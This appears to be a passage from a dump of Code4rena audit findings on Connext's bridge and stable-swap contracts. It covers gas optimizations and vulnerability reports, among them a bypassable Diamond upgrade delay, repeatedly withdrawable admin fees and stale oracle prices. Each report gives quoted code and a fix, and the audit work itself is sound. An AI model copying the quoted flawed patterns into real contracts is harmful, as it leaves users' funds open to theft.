core/connext/libraries/LibDiamond.sol:170:    enforceHasContractCode(_facetAddress, \"LibDiamondCut: New facet has no code\"); core/connext/libraries/LibDiamond.sol:191:    require(_facetAddress != address(0), \"LibDiamondCut: Can't remove function that doesn't exist\"); core/connext/libraries/LibDiamond.sol:193:    require(_facetAddress != address(this), \"LibDiamondCut: Can't remove immutable function\"); core/connext/libraries/LibDiamond.sol:224:      require(_calldata.length == 0, \"LibDiamondCut: _init is address(0) but_calldata is not empty\"); core/connext/libraries/LibDiamond.sol:226:      require(_calldata.length > 0, \"LibDiamondCut: _calldata is empty but _init is not address(0)\"); core/connext/libraries/LibDiamond.sol:228:        enforceHasContractCode(_init, \"LibDiamondCut: _init address has no code\"); core/connext/libraries/LibDiamond.sol:236:          revert(\"LibDiamondCut: _init function reverted\"); core/connext/libraries/SwapUtils.sol:595:        balances[i] = balances[i].sub(amounts[i], \"Cannot withdraw more than available\"); core/connext/libraries/SwapUtils.sol:697:    require(dy <= self.balances[tokenIndexTo], \"Cannot get more than pool balance\"); core/connext/libraries/SwapUtils.sol:784:    require(dy <= self.balances[tokenIndexTo], \"Cannot get more than pool balance\"); core/connext/libraries/SwapUtils.sol:1015:        balances1[i] = v.balances[i].sub(amounts[i], \"Cannot withdraw more than available\"); ```  Consider shortening the revert strings to fit in 32 bytes.  ## 5. SafeMath is not needed when using Solidity version 0.8+  Solidity version 0.8+ already implements overflow and underflow checks by default. Using the SafeMath library from OpenZeppelin (which is more gas expensive than the 0.8+ overflow checks) is therefore redundant.  Consider using the built-in checks instead of SafeMath and remove SafeMath here:  ```solidity core/connext/helpers/ConnextPriceOracle.sol:2:pragma solidity 0.8.14; core/connext/helpers/ConnextPriceOracle.sol:4:import {SafeMath} from \"@openzeppelin/contracts/utils/math/SafeMath.sol\"; core/connext/helpers/ConnextPriceOracle.sol:45:  using SafeMath for uint256;  core/connext/helpers/OZERC20.sol:2:pragma solidity 0.8.14; core/connext/helpers/OZERC20.sol:10:import \"@openzeppelin/contracts/utils/math/SafeMath.sol\"; core/connext/helpers/OZERC20.sol:37:  using SafeMath for uint256;  core/connext/libraries/AmplificationUtils.sol:2:pragma solidity 0.8.14; core/connext/libraries/AmplificationUtils.sol:5:import {SafeMath} from \"@openzeppelin/contracts/utils/math/SafeMath.sol\"; core/connext/libraries/AmplificationUtils.sol:15:  using SafeMath for uint256;  core/connext/libraries/SwapUtils.sol:2:pragma solidity 0.8.14; core/connext/libraries/SwapUtils.sol:4:import {SafeMath} from \"@openzeppelin/contracts/utils/math/SafeMath.sol\"; core/connext/libraries/SwapUtils.sol:20:  using SafeMath for uint256; ```  ## 6. `>=` is cheaper than `>` (and `<=` cheaper than `<`)  Strict inequalities (`>`) are more expensive than non-strict ones (`>=`). This is due to some supplementary checks (ISZERO, 3 gas). This also holds true between `<=` and `<`.    Consider replacing strict inequalities with non-strict ones to save some gas here:  ```solidity core/connext/helpers/SponsorVault.sol:214:      sponsoredFee = balance < _liquidityFee ? balance : _liquidityFee; core/connext/helpers/SponsorVault.sol:258:      sponsoredFee = sponsoredFee > address(this).balance ? address(this).balance : sponsoredFee; ```  ## 7. Splitting `require()` statements that use `&&` saves gas  If you're using the Optimizer at 200, instead of using the `&&` operator in a single require statement to check multiple conditions, Consider using multiple require statements with 1 condition per require statement:  ```solidity core/connext/helpers/StableSwap.sol:85:          tokenIndexes[address(_pooledTokens[i])] == 0 && _pooledTokens[0] != _pooledTokens[i], core/connext/libraries/AmplificationUtils.sol:86:    require(futureA_ > 0 && futureA_ < MAX_A, \"futureA_ must be > 0 and < MAX_A\"); core/connext/libraries/SwapUtils.sol:397:    require(tokenIndexFrom < numTokens && tokenIndexTo < numTokens, \"Tokens must be in pool\"); core/connext/libraries/SwapUtils.sol:493:    require(tokenIndexFrom < xp.length && tokenIndexTo < xp.length, \"Token index out of range\"); core/connext/libraries/SwapUtils.sol:524:    require(tokenIndexFrom < xp.length && tokenIndexTo < xp.length, \"Token index out of range\"); core/connext/libraries/SwapUtils.sol:1007:    require(maxBurnAmount <= v.lpToken.balanceOf(msg.sender) && maxBurnAmount != 0, \">LP.balanceOf\"); ```  Please, note that this might not hold true at a higher number of runs for the Optimizer (10k). However, it indeed is true at 200.  ## 8. Using private rather than public for constants saves gas  If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table  ```solidity core/connext/facets/BridgeFacet.sol:68:  uint16 public constant AAVE_REFERRAL_CODE = 0; core/connext/helpers/PriceOracle.sol:6:  bool public constant isPriceOracle = true; core/connext/libraries/AmplificationUtils.sol:21:  uint256 public constant A_PRECISION = 100; core/connext/libraries/AmplificationUtils.sol:22:  uint256 public constant MAX_A = 10**6; core/connext/libraries/LibCrossDomainProperty.sol:37:  bytes29 public constant EMPTY = hex\"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\"; core/connext/libraries/LibCrossDomainProperty.sol:38:  bytes public constant EMPTY_BYTES = hex\"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\"; core/shared/Version.sol:9:  uint8 public constant VERSION = 0;  ```  ## 9. `<array>.length` should not be looked up in every loop of a `for-loop`  Reading array length at each iteration of the loop consumes more gas than necessary.    In the best case scenario (length read on a memory variable), caching the array length in the stack saves around 3 gas per iteration. In the worst case scenario (external calls at each iteration), the amount of gas wasted can be massive.  Here, Consider storing the array's length in a variable before the for-loop, and use this new variable instead:  ```solidity core/connext/facets/RelayerFacet.sol:140:    for (uint256 i; i < _transferIds.length; ) { core/connext/facets/RelayerFacet.sol:164:    for (uint256 i; i < _transferIds.length; ) { core/connext/facets/StableSwapFacet.sol:415:    for (uint8 i = 0; i < _pooledTokens.length; i++) { core/connext/helpers/ConnextPriceOracle.sol:176:    for (uint256 i = 0; i < tokenAddresses.length; i++) { core/connext/helpers/Multicall.sol:16:    for (uint256 i = 0; i < calls.length; i++) { core/connext/helpers/StableSwap.sol:81:    for (uint8 i = 0; i < _pooledTokens.length; i++) { core/connext/libraries/LibDiamond.sol:104:    for (uint256 facetIndex; facetIndex < _diamondCut.length; facetIndex++) { core/connext/libraries/LibDiamond.sol:129:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) { core/connext/libraries/LibDiamond.sol:147:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) { core/connext/libraries/LibDiamond.sol:162:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) { core/connext/libraries/SwapUtils.sol:205:    for (uint256 i = 0; i < xp.length; i++) { core/connext/libraries/SwapUtils.sol:558:    for (uint256 i = 0; i < balances.length; i++) { core/connext/libraries/SwapUtils.sol:591:    for (uint256 i = 0; i < balances.length; i++) { core/connext/libraries/SwapUtils.sol:844:    for (uint256 i = 0; i < pooledTokens.length; i++) { core/connext/libraries/SwapUtils.sol:869:      for (uint256 i = 0; i < pooledTokens.length; i++) { core/connext/libraries/SwapUtils.sol:924:    for (uint256 i = 0; i < amounts.length; i++) { core/connext/libraries/SwapUtils.sol:1014:      for (uint256 i = 0; i < pooledTokens.length; i++) { core/connext/libraries/SwapUtils.sol:1019:      for (uint256 i = 0; i < pooledTokens.length; i++) { core/connext/libraries/SwapUtils.sol:1039:    for (uint256 i = 0; i < pooledTokens.length; i++) { core/connext/libraries/SwapUtils.sol:1055:    for (uint256 i = 0; i < pooledTokens.length; i++) { ```  ## 10. `++i` costs less gas compared to `i++` or `i += 1` (same for `--i` vs `i--` or `i -= 1`)  Pre-increments and pre-decrements are cheaper.  For a `uint256 i` variable, the following is true with the Optimizer enabled at 10k:  **Increment:**  - `i += 1` is the most expensive form - `i++` costs 6 gas less than `i += 1` - `++i` costs 5 gas less than `i++` (11 gas less than `i += 1`)  **Decrement:**  - `i -= 1` is the most expensive form - `i--` costs 11 gas less than `i -= 1` - `--i` costs 5 gas less than `i--` (16 gas less than `i -= 1`)  Note that post-increments (or post-decrements) return the old value before incrementing or decrementing, hence the name *post-increment*:  ```solidity uint i = 1;   uint j = 2; require(j == i++, \"This will be false as i is incremented after the comparison\"); ```    However, pre-increments (or pre-decrements) return the new value:    ```solidity uint i = 1;   uint j = 2; require(j == ++i, \"This will be true as i is incremented before the comparison\"); ```    In the pre-increment case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`.      Affected code:    ```solidity core/connext/facets/BridgeFacet.sol:332:      s.nonce += 1; core/connext/facets/BridgeFacet.sol:613:          i++; core/connext/facets/BridgeFacet.sol:684:          i++; core/connext/facets/BridgeFacet.sol:799:            i++; core/connext/facets/DiamondLoupeFacet.sol:31:    for (uint256 i; i < numFacets; i++) { core/connext/facets/RelayerFacet.sol:144:        i++; core/connext/facets/RelayerFacet.sol:168:        i++; core/connext/facets/StableSwapFacet.sol:415:    for (uint8 i = 0; i < _pooledTokens.length; i++) { core/connext/helpers/ConnextPriceOracle.sol:176:    for (uint256 i = 0; i < tokenAddresses.length; i++) { core/connext/helpers/Multicall.sol:16:    for (uint256 i = 0; i < calls.length; i++) { core/connext/helpers/StableSwap.sol:81:    for (uint8 i = 0; i < _pooledTokens.length; i++) { core/connext/libraries/Encoding.sol:22:    for (uint8 i = 0; i < 10; i += 1) { core/connext/libraries/Encoding.sol:36:    for (uint8 i = 31; i > 15; i -= 1) { core/connext/libraries/Encoding.sol:45:      for (uint8 i = 15; i < 255; i -= 1) { core/connext/libraries/LibDiamond.sol:104:    for (uint256 facetIndex; facetIndex < _diamondCut.length; facetIndex++) { core/connext/libraries/LibDiamond.sol:129:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) { core/connext/libraries/LibDiamond.sol:134:      selectorPosition++; core/connext/libraries/LibDiamond.sol:147:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) { core/connext/libraries/LibDiamond.sol:153:      selectorPosition++; core/connext/libraries/LibDiamond.sol:162:    for (uint256 selectorIndex; selectorIndex < _functionSelectors.length; selectorIndex++) { core/connext/libraries/SwapUtils.sol:205:    for (uint256 i = 0; i < xp.length; i++) { core/connext/libraries/SwapUtils.sol:254:    for (uint256 i = 0; i < numTokens; i++) { core/connext/libraries/SwapUtils.sol:268:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) { core/connext/libraries/SwapUtils.sol:289:    for (uint256 i = 0; i < numTokens; i++) { core/connext/libraries/SwapUtils.sol:300:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) { core/connext/libraries/SwapUtils.sol:302:      for (uint256 j = 0; j < numTokens; j++) { core/connext/libraries/SwapUtils.sol:344:    for (uint256 i = 0; i < numTokens; i++) { core/connext/libraries/SwapUtils.sol:405:    for (uint256 i = 0; i < numTokens; i++) { core/connext/libraries/SwapUtils.sol:425:    for (uint256 i = 0; i < MAX_LOOP_LIMIT; i++) { core/connext/libraries/SwapUtils.sol:558:    for (uint256 i = 0; i < balances.length; i++) { core/connext/libraries/SwapUtils.sol:591:    for (uint256 i = 0; i < balances.length; i++) { core/connext/libraries/SwapUtils.sol:844:    for (uint256 i = 0; i < pooledTokens.length; i++) { core/connext/libraries/SwapUtils.sol:869:      for (uint256 i = 0; i < pooledTokens.length; i++) { core/connext/libraries/SwapUtils.sol:924:    for (uint256 i = 0; i < amounts.length; i++) { core/connext/libraries/SwapUtils.sol:1014:      for (uint256 i = 0; i < pooledTokens.length; i++) { core/connext/libraries/SwapUtils.sol:1019:      for (uint256 i = 0; i < pooledTokens.length; i++) { core/connext/libraries/SwapUtils.sol:1039:    for (uint256 i = 0; i < pooledTokens.length; i++) { core/connext/libraries/SwapUtils.sol:1055:    for (uint256 i = 0; i < pooledTokens.length; i++) { core/relayer-fee/libraries/RelayerFeeMessage.sol:85:        i++; ```  Consider using pre-increments and pre-decrements where they are relevant (meaning: not where post-increments/decrements logic are relevant).  ## 11. Increments/decrements can be unchecked in for-loops  In Solidity 0.8+, there's a"}, {"title": "Swaps done internally will be not be possible", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/249", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/facets/BridgeFacet.sol#L346 https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/facets/BridgeFacet.sol#L812   # Vulnerability details    Affected  functions(that rely on swapAsset()) are:  [https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/libraries/AssetLogic.sol#L193](https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/libraries/AssetLogic.sol#L193)  [https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/libraries/AssetLogic.sol#L159](https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/libraries/AssetLogic.sol#L159)  swapAsset() facilitates two swaps, either using the internal or external pool. But if an internal pool exists, a swap will be unsuccessful because the call to  s.swapStorages[_canonicalId].swapInternal() takes two incorrect arguments (due to an incorrect ordering, this seemed to be an oversight, acknowledged by #Layne) :  [https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/libraries/AssetLogic.sol#L278-L279](https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/libraries/AssetLogic.sol#L278-L279)  Based on the above mentioned code , the arguments would be incorrectly changed to :  [https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/libraries/SwapUtils.sol#L744-L745](https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/libraries/SwapUtils.sol#L744-L745)  The condition checked here:  [https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/libraries/SwapUtils.sol#L750](https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/libraries/SwapUtils.sol#L750)  will never be true as the msg.sender would never own the quantity of tokens being swapped from since it's the wrong token.  "}, {"title": "Diamond upgrade proposition can be falsified", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/241", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/facets/DiamondCutFacet.sol#L16-L29 https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/libraries/LibDiamond.sol#L94-L118 https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/libraries/LibDiamond.sol#L222-L240   # Vulnerability details  ## Impact Diamond is to be upgraded after a certain delay to give time to the community to verify changes made by the developers. If the proposition can be falsified, the contract admins can exploit the contract in any way of their choice.  ## Proof of Concept To determine the id of the proposal, only its facet changes are hashed, skipping two critical pieces of data - the `_init` and `_calldata`. During a diamond upgrade, devs can choose what code will be executed **by the contract using a delegatecall**. Thus, they can make the contract perform **any** actions of their choice.  ## Tools Used Manual analysis  ## Recommended Mitigation Steps Add `_init` and `_calldata` to the proposition hash.   "}, {"title": "`LibDiamond.diamondCut()` should check `diamondStorage().acceptanceTimes[keccak256(abi.encode(_diamondCut))] != 0`", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/215", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/libraries/LibDiamond.sol#L100-L103 https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/libraries/LibDiamond.sol#L71-L79 https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/libraries/LibDiamond.sol#L83-L90   # Vulnerability details  ## Impact  Normally, `diamondStorage().acceptanceTimes[keccak256(abi.encode(_diamondCut))]` will be set in `LibDiamond.proposeDiamondCut()`. Then in `LibDiamond.diamondCut()`, it checks that `diamondStorage().acceptanceTimes[keccak256(abi.encode(_diamondCut))] < block.timestamp`.  However, `LibDiamond.rescindDiamondCut()` will set `diamondStorage().acceptanceTimes[keccak256(abi.encode(_diamondCut))]` to 0. Which can easily pass the check in `diamondCut()`. But `rescindDiamondCut` should rescind `_diamondCut`. In conclusion, using `rescindDiamondCut()` can easily bypass the delay time.  Moreover, if `proposeDiamondCut()` has never been called, the check for delay time is always passed.  ## Proof of Concept  `diamondStorage().acceptanceTimes[keccak256(abi.encode(_diamondCut))]` will be set in `LibDiamond.proposeDiamondCut()` https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/libraries/LibDiamond.sol#L71-L79 ```   function proposeDiamondCut(     IDiamondCut.FacetCut[] memory _diamondCut,     address _init,     bytes memory _calldata   ) internal {     uint256 acceptance = block.timestamp + _delay;     diamondStorage().acceptanceTimes[keccak256(abi.encode(_diamondCut))] = acceptance;     emit DiamondCutProposed(_diamondCut, _init, _calldata, acceptance);   } ```  Then in `LibDiamond.diamondCut()`, it checks that `diamondStorage().acceptanceTimes[keccak256(abi.encode(_diamondCut))] < block.timestamp` https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/libraries/LibDiamond.sol#L100-L103 ```   function diamondCut(     IDiamondCut.FacetCut[] memory _diamondCut,     address _init,     bytes memory _calldata   ) internal {     require(       diamondStorage().acceptanceTimes[keccak256(abi.encode(_diamondCut))] < block.timestamp,       \"LibDiamond: delay not elapsed\"     );     \u2026   } ```  However, `LibDiamond.rescindDiamondCut()` will set `diamondStorage().acceptanceTimes[keccak256(abi.encode(_diamondCut))]` to 0. Which can easily pass the check in `diamondCut()` https://github.com/code-423n4/2022-06-connext/blob/main/contracts/contracts/core/connext/libraries/LibDiamond.sol#L83-L90 ```   function rescindDiamondCut(     IDiamondCut.FacetCut[] memory _diamondCut,     address _init,     bytes memory _calldata   ) internal {     diamondStorage().acceptanceTimes[keccak256(abi.encode(_diamondCut))] = 0;     emit DiamondCutRescinded(_diamondCut, _init, _calldata);   } ```  ``` diamondStorage().acceptanceTimes[keccak256(abi.encode(_diamondCut))] = 0 < block.timestamp ```   ## Tools Used  None  ## Recommended Mitigation Steps  Add another check in `diamondCut`  ```   function diamondCut(     IDiamondCut.FacetCut[] memory _diamondCut,     address _init,     bytes memory _calldata   ) internal {     require(       diamondStorage().acceptanceTimes[keccak256(abi.encode(_diamondCut))] < block.timestamp && diamondStorage().acceptanceTimes[keccak256(abi.encode(_diamondCut))] != 0,       \"LibDiamond: delay not elapsed\"     );     \u2026   } ```   "}, {"title": "Tokens with `decimals` larger than `18` are not supported", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/204", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/helpers/ConnextPriceOracle.sol#L99-L115   # Vulnerability details  For tokens with decimals larger than 18, many functions across the codebase will revert due to underflow.  https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/helpers/ConnextPriceOracle.sol#L99-L115  ```solidity function getPriceFromDex(address _tokenAddress) public view returns (uint256) {     PriceInfo storage priceInfo = priceRecords[_tokenAddress];     if (priceInfo.active) {       uint256 rawTokenAmount = IERC20Extended(priceInfo.token).balanceOf(priceInfo.lpToken);       uint256 tokenDecimalDelta = 18 - uint256(IERC20Extended(priceInfo.token).decimals());       uint256 tokenAmount = rawTokenAmount.mul(10**tokenDecimalDelta);       uint256 rawBaseTokenAmount = IERC20Extended(priceInfo.baseToken).balanceOf(priceInfo.lpToken);       uint256 baseTokenDecimalDelta = 18 - uint256(IERC20Extended(priceInfo.baseToken).decimals());       uint256 baseTokenAmount = rawBaseTokenAmount.mul(10**baseTokenDecimalDelta);       uint256 baseTokenPrice = getTokenPrice(priceInfo.baseToken);       uint256 tokenPrice = baseTokenPrice.mul(baseTokenAmount).div(tokenAmount);        return tokenPrice;     } else {       return 0;     }   } ```  https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/facets/StableSwapFacet.sol#L426  ```solidity precisionMultipliers[i] = 10**uint256(SwapUtils.POOL_PRECISION_DECIMALS - decimals[i]); ```  Chainlink feeds' with decimals > 18 are not supported neither:  https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/helpers/ConnextPriceOracle.sol#L122-L140  ```solidity function getPriceFromChainlink(address _tokenAddress) public view returns (uint256) {     AggregatorV3Interface aggregator = aggregators[_tokenAddress];     if (address(aggregator) != address(0)) {       (, int256 answer, , , ) = aggregator.latestRoundData();        // It's fine for price to be 0. We have two price feeds.       if (answer == 0) {         return 0;       }        // Extend the decimals to 1e18.       uint256 retVal = uint256(answer);       uint256 price = retVal.mul(10**(18 - uint256(aggregator.decimals())));        return price;     }      return 0;   } ```  ### Recommendation  Consider checking if decimals > 18 and normalize the value by div the decimals difference.  "}, {"title": "Wrong implementation of `withdrawAdminFees()` can cause the `adminFees` to be charged multiple times and therefore cause users' fund loss", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/202", "labels": ["bug", "3 (High Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/libraries/SwapUtils.sol#L1053-L1062   # Vulnerability details  ```solidity function withdrawAdminFees(Swap storage self, address to) internal {   IERC20[] memory pooledTokens = self.pooledTokens;   for (uint256 i = 0; i < pooledTokens.length; i++) {     IERC20 token = pooledTokens[i];     uint256 balance = self.adminFees[i];     if (balance != 0) {       token.safeTransfer(to, balance);     }   } } ```  `self.adminFees[i]` should be reset to 0 every time it's withdrawn. Otherwise, the `adminFees` can be withdrawn multiple times.  The admin may just be unaware of this issue and casualty `withdrawAdminFees()` from time to time, and rug all the users slowly.  ### Recommendation  Change to:  ```solidity function withdrawAdminFees(Swap storage self, address to) internal {   IERC20[] memory pooledTokens = self.pooledTokens;   for (uint256 i = 0; i < pooledTokens.length; i++) {     IERC20 token = pooledTokens[i];     uint256 balance = self.adminFees[i];     if (balance != 0) {       self.adminFees[i] = 0;       token.safeTransfer(to, balance);     }   } } ```  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/200", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "details is used only when !s.tokenRegistry.isLocalOrigin(token) holds:  https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/facets/BridgeFacet.sol#L957-L974  ```solidity     bytes32 details = action.detailsHash();      // if the token is of remote origin, mint the tokens. will either     // - be credited to router (fast liquidity)     // - be reserved for execution (slow liquidity)     if (!s.tokenRegistry.isLocalOrigin(token)) {       IBridgeToken(token).mint(address(this), amount);       // Tell the token what its detailsHash is       IBridgeToken(token).setDetailsHash(details);     }     // NOTE: if the token is of local origin, it means it was escrowed     // in this contract at xcall      // mark the transfer as reconciled     s.reconciledTransfers[transferId] = true;      return (amount, token, transferId);   } ```  ## Recommended Mitigation Steps  Move into the `if` scope:  ```     // if the token is of remote origin, mint the tokens. will either     // - be credited to router (fast liquidity)     // - be reserved for execution (slow liquidity)     if (!s.tokenRegistry.isLocalOrigin(token)) {       bytes32 details = action.detailsHash();       IBridgeToken(token).mint(address(this), amount);       // Tell the token what its detailsHash is       IBridgeToken(token).setDetailsHash(details);     } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/190", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Chainlink oracle aggregator data is insufficiently validated in `ConnextPriceOracle.sol`\r \r # Lines of code\r \r https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/helpers/ConnextPriceOracle.sol#L122-L140\r \r \r # Vulnerability details\r \r ### Impact\r \r The function `getPriceFromChainlink()` in `ConnextPriceOracle.sol` fetches the `latestRoundData()` from a registered aggregator (Chainlink oracle feed) for a specified token. However, neither round completeness or the quoted timestamp are checked to ensure that the reported price is not stale.\r \r Since Connext is creating bridged representations of tokens from other chains, it is vital for the reported prices of tokens to be accurate. While Connext also consults the DEX reported price of the tokens, some pairs with thin liquidity could also return inaccurate prices.\r \r ### Proof of Concept\r ```solidity\r function getPriceFromChainlink(address _tokenAddress) public view returns (uint256) {\r     AggregatorV3Interface aggregator = aggregators[_tokenAddress];\r     if (address(aggregator) != address(0)) {\r       (, int256 answer, , , ) = aggregator.latestRoundData();\r \r       // It's fine for price to be 0. We have two price feeds.\r       if (answer == 0) {\r         return 0;\r       }\r \r       // Extend the decimals to 1e18.\r       uint256 retVal = uint256(answer);\r       uint256 price = retVal.mul(10**(18 - uint256(aggregator.decimals())));\r \r       return price;\r     }\r \r     return 0;\r   }\r ```\r Note that the other returned variables `roundId`, `startedAt`, `updatedAt`, and `answeredInRound` are omitted from the return result of `aggregator.latestRoundData()`.\r \r ### Mitigation steps\r Add additional validation:\r ```solidity\r     ...\r      (uint80 roundID, int256 price, , uint256 updatedAt, uint80 answeredInRound) = aggregator.latestRoundData();\r     require(answeredInRound >= roundID, \"ChainLink: Stale price\");\r     require(updatedAt != 0, \"ChainLink: Round not complete\");\r     ...\r ```\r \r ### Tools Used\r Manual review\r \r "}, {"title": "BridgeFacet's _executePortalTransfer ignores underlying token amount withdrawn from Aave pool", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/181", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/facets/BridgeFacet.sol#L882-L900   # Vulnerability details  _executePortalTransfer can introduce underlying token deficit by accounting for full underlying amount received from Aave unconditionally on what was actually withdrawn from Aave pool. Actual amount withdrawn is returned by `IAavePool(s.aavePool).withdraw()`, but currently is not used.  Setting the severity to medium as this can end up with a situation of partial insolvency, when where are a surplus of atokens, but deficit of underlying tokens in the bridge, so bridge functionality can become unavailable as there will be not enough underlying tokens, which were used up in the previous operations when atokens wasn't converted to underlying fully and underlying tokens from other operations were used up instead without accounting. I.e. the system in this situation supposes that all atokens are in the form of underlying tokens while there will be some atokens left unconverted due to withdrawal being only partial.  ## Proof of Concept  Call sequence here is execute() -> _handleExecuteLiquidity() -> _executePortalTransfer().   BridgeFacet._executePortalTransfer() mints the atokens needed, then withdraws them from Aave pool, always accounting for the full withdrawal:  https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/facets/BridgeFacet.sol#L882-L900  ```solidity   /**    * @notice Uses Aave Portals to provide fast liquidity    */   function _executePortalTransfer(     bytes32 _transferId,     uint256 _fastTransferAmount,     address _local,     address _router   ) internal returns (uint256, address) {     // Calculate local to adopted swap output if needed     (uint256 userAmount, address adopted) = AssetLogic.calculateSwapFromLocalAssetIfNeeded(_local, _fastTransferAmount);      IAavePool(s.aavePool).mintUnbacked(adopted, userAmount, address(this), AAVE_REFERRAL_CODE);      // Improvement: Instead of withdrawing to address(this), withdraw directly to the user or executor to save 1 transfer     IAavePool(s.aavePool).withdraw(adopted, userAmount, address(this));      // Store principle debt     s.portalDebt[_transferId] = userAmount; ```   Aave pool's withdraw() returns the amount of underlying asset that was actually withdrawn:  https://github.com/aave/aave-v3-core/blob/master/contracts/protocol/pool/Pool.sol#L196-L217  https://github.com/aave/aave-v3-core/blob/master/contracts/protocol/libraries/logic/SupplyLogic.sol#L93-L111  If a particular lending pool has liquidity shortage at the moment, say all underlying is lent out, full withdrawal of the requested underlying token amount will not be possible.  ## Recommended Mitigation Steps  Consider adjusting for the amount actually withdrawn. Also the buffer that stores minted but not yet used atoken amount, say aAmountStored, can be introduced.  For example:   ```  +   uint256 amountNeeded = userAmount < aAmountStored ? 0 : userAmount - aAmountStored;  -   IAavePool(s.aavePool).mintUnbacked(adopted, userAmount, address(this), AAVE_REFERRAL_CODE); +   if (amountNeeded > 0) { +       IAavePool(s.aavePool).mintUnbacked(adopted, amountNeeded, address(this), AAVE_REFERRAL_CODE); +   }      // Improvement: Instead of withdrawing to address(this), withdraw directly to the user or executor to save 1 transfer -   IAavePool(s.aavePool).withdraw(adopted, userAmount, address(this)); +   uint256 amountWithdrawn = IAavePool(s.aavePool).withdraw(adopted, userAmount, address(this));      // Store principle debt -   s.portalDebt[_transferId] = userAmount; +   s.portalDebt[_transferId] = amountWithdrawn; // can't exceed userAmount +   aAmountStored = (userAmount < aAmountStored ? aAmountStored : userAmount) - amountWithdrawn; // we used amountWithdrawn  ```  "}, {"title": "Missing whenNotPaused modifier", "html_url": "https://github.com/code-423n4/2022-06-connext-findings/issues/175", "labels": ["bug", "2 (Med Risk)", "resolved", "sponsor confirmed"], "target": "2022-06-connext-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-connext/blob/b4532655071566b33c41eac46e75be29b4a381ed/contracts/contracts/core/connext/facets/StableSwapFacet.sol#L279-L286   # Vulnerability details  ## Impact In `StableSwapFacet.sol`, two swapping 